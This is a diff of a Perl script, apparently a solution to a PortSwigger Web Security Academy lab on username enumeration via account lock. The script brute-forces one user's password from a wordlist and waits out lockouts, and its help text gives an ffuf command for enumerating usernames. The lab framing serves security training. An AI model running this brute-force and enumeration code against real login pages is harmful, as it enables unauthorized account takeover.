@@ -15,7 +15,7 @@ use Term::ANSIColor;
 
 BEGIN {
     say colored("PortSwigger Web Security Academy", "bold yellow");
-    say colored("Lab: Broken brute-force protection, IP block", "bold yellow");
+    say colored("Lab: Username enumeration via account lock", "bold yellow");
     say colored("Solution by weXe1", "bold blue");
     print "\n";
 }
@@ -26,27 +26,22 @@ our(
     $url,
     $proxy,
     $wordlist,
+    $username,
     $help,
 );
-
-our $goodCredentials = {
-    username => 'wiener',
-    password => 'peter'
-};
-
-# target user's name
-our $targetUsername = 'carlos';
 
 GetOptions(
     'u|url=s'           => \$url,
     'p|proxy=s'         => \$proxy,
     'w|wordlist=s'      => \$wordlist,
+    'n|username=s'      => \$username,
     'h|help'            => \$help
 );
 
 pod2usage(1) if $help;
 pod2usage(1) unless $url;
 pod2usage(1) unless $wordlist;
+pod2usage(1) unless $username;
 
 our $ua = LWP::UserAgent->new(
     protocols_allowed   => ['http', 'https']
@@ -60,33 +55,34 @@ if ($proxy) {
 
 open(my $fh, $wordlist) or die colored("[!!] Cannot open file '$wordlist': $!\n");
 
-say colored("[*] Obtaining password length for user '$targetUsername'", "cyan");
+say colored("[!] This is just brute-forcing a password - remember to get a username candidate first", "magenta");
 
-my $count = 1;
+say colored("[*] Obtaining password length for user '$username', this may take a while...", "cyan");
+
 while (my $pass = <$fh>) {
     chomp($pass);
-    $count++;
-    if ($count == 3) {
-        &makeRequest($goodCredentials->{username}, $goodCredentials->{password});
-        $count = 1;
-    }
 
-    if (&makeRequest($targetUsername, $pass)) {
+    say "[*] Testing: $pass";
+
+    if (&makeRequest($pass)) {
         say colored("[+] Found: $pass" , "green");
-        close $fh;
         exit;
     }
 }
 
-say colored("[-] Cannot obtain password with provided wordlist", "red");
-close $fh;
+say colored("[-] Cannot obtain password with provided username and wordlist", "red");
 
 sub makeRequest {
-    my ($username, $password) = @_;
+    my $password = shift;
     my $response = $ua->post($url, {username => $username, password => $password});
 
     if ($response->is_success || $response->status_line =~ /302 found/i) {
-        return ($response->decoded_content =~ /incorrect password/ig) ? 0 : 1;
+        if ($response->decoded_content =~ /You have made too many incorrect login attempts. Please try again in 1 minute/ig) {
+            say colored("[zzz] Nap for 1 minute...", "blue");
+            sleep(65);
+            return &makeRequest($password);
+        }
+        return ($response->decoded_content =~ /Invalid username or password/ig) ? 0 : 1;
     } else {
         say STDERR colored($response->status_line, "on_red");
         return 0;
@@ -103,7 +99,14 @@ __END__
 
      --url=<URL>                Target URL of the lab (required)
      --wordlist=<FILENAME>      Password wordlist file (required)
+     --username=<USERNAME>      Obtained possible username (required)
      --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
      --help                     Prints this help and exit
+
+To get a username candidate you can use a tool such as ffuf (https://github.com/ffuf/ffuf) and a little deduction, for example:
+
+$ ffuf -w wordlists/usernames.txt:USER -w wordlists/passwords.txt:PASS -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=USER&password=PASS' -u <URL HERE> -fr 'Invalid username or password'
+
+You'll see messages with a recurring username - this could be it :)
 
 =cut
